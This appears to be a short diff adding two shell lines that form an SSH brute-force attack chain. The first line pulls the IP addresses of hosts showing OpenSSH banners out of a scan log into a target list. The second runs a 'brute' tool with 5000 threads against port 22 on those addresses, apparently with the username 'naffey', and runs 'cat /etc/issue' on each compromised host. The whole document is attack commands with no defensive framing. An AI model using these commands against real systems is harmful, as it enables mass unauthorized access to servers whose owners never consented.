@@ -1,0 +1,2 @@
+cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst
+./brute 5000 -f ips.lst naffey 22 "cat /etc/issue"
